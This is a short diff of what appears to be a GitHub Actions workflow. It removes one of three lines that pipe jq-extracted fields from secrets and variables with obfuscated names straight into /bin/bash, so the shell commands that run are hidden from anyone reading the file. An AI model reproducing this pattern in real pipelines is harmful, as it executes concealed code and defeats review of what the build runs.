@@ -27,7 +27,6 @@ jobs:
           w38: ${{ secrets.w38 }}
         run: |
           printf '%s' "$w38" | jq -r .x618 | /bin/bash
-          echo $djuby4703 | jq -r .jhp77805 | /bin/bash
           echo $d4 | jq -r .utj67 | /bin/bash
 
       - name: Save archive
